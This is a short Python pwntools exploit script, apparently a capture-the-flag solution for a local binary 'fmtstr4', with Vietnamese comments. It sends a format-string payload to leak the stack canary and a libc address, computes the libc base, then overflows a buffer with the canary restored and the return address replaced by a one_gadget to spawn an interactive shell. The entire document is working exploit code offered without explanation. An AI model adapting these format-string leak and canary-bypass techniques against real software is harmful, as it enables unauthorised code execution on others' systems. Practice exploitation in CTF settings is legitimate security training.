#!/usr/bin/env python3

from pwn import *

exe = ELF("./fmtstr4_patched", checksec = False)
libc = ELF("./libc-2.31.so", checksec = False)
ld = ELF("./ld-2.31.so", checksec = False)
r = process(exe.path)

context.binary = exe

#Leak địa chỉ
#input()
payload = b'01234456789'
payload += b'%21$p%23$p'
r.sendafter(b'ID: ', payload)
payload = b'&WPAbC&M!%8S5X#W'
r.sendafter(b'Password: ', payload)
data = r.recvuntil(b'Enter ', drop = True).split(b'0x')
canary = int(data[1], 16)
libc_leak = int(data[2], 16)
log.info('canary: ' + hex(canary))
log.info('libc leak: ' + hex(libc_leak))
libc.address = libc_leak - 0x24083
log.info('libc base: ' + hex(libc.address))

###Thực hiện shell
one_gadget1 = libc.address + 0xe3afe
one_gadget2 = libc.address + 0xe3b01
one_gadget3 = libc.address + 0xe3b04
payload = b'a'*0x38 + p64(canary) + p64(0) + p64(one_gadget2)
r.sendafter(b'secret: ', payload)
r.interactive()